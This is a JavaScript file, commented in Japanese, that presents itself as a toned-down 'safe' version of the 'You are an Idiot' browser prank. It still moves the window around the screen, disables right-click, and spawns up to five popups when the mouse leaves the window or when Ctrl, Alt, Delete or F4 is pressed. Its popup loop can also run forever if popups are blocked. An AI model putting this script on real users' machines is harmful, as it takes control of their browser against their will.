// you_safe.js - 安全版「You are an Idiot」JS

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

var maxWindows = 5;      // 最大ウィンドウ数
var openWindows = 0;     // 現在開いているウィンドウ数

// ウィンドウを開く
function openWindow(url) {
    if (openWindows >= maxWindows) return; // 上限チェック

    var aWindow = window.open(
        url, "_blank",
        'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330'
    );
    if (aWindow) openWindows++;
}

// 元の proCreate() を安全化
function proCreate() {
    while (openWindows < maxWindows) {
        openWindow('lol.html'); // lol.html を開く
    }
}

// ウィンドウの移動処理
function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }

function fOff() { flagRun = 0; }

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun == 1) {
        window.moveTo(xPos, yPos);
        setTimeout(playBall, 1);
    }
}

// タイトル変更（必要なら使用）
function changeTitle(title) {
    document.title = title;
}

// 初期処理
window.onload = function () {
    flagRun = 1;
    playBall();
    return true;
};

// マウスが画面外に出たとき（最大5個まで生成）
window.onmouseout = function () {
    proCreate();
    return null;
};

// 右クリック禁止
window.oncontextmenu = function() { return false; };

// キー押下時（無限 alert は削除、安全版）
window.onkeydown = function(event) {
    // 必要なら特定キーでウィンドウを開く
    var keyCode = event.keyCode;
    if ([17, 18, 46, 115].includes(keyCode)) {  
        proCreate();
    }
    return null;
};
